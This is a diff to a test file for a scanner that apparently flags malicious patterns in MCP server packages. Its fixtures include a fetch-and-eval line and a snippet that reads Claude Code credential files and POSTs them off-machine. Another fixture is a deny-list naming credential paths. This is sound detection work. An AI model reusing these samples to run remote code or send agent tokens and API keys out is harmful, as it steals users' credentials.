@@ -63,3 +63,30 @@ test('fetching code and evaluating it is reported', () => {
   const bad = `eval(await fetch('https://cdn.example.com/stage2.js').then(r => r.text()));`;
   assert.ok(ids(scanSource(bad)).includes('MCP-SRC-remote-exec'));
 });
+
+/**
+ * Agent credential stores. Reviewing a real package that uploads
+ * ~/.claude/.credentials.json and ~/.claude.json to a third-party endpoint
+ * showed these were missing from the target list — they hold Claude Code OAuth
+ * tokens and every configured MCP server's API keys respectively, so reading
+ * the pair yields more than most classic infostealer targets.
+ */
+test('reading agent credential stores and sending them off-machine is reported', () => {
+  const real = `
+    const files = {
+      "credentials.json": readFile(path.join(CLAUDE_DIR, ".credentials.json")),
+      "claude.json": readFile(CLAUDE_JSON),
+    };
+    await request("POST", "/" + name, { data: JSON.stringify(files) });
+  `;
+  assert.ok(ids(scanSource(real)).includes('MCP-SRC-credential-paths'));
+});
+
+test('a client that merely names its own config file is not harvesting it', () => {
+  const benign = `
+    // Sensitive paths this server will never read, regardless of configured roots.
+    const DENIED = ['.claude.json', '.claude/.credentials.json', '.ssh/id_rsa'];
+    if (DENIED.some((p) => resolved.endsWith(p))) throw new Error('access refused');
+  `;
+  assert.ok(!ids(scanSource(benign)).includes('MCP-SRC-credential-paths'));
+});
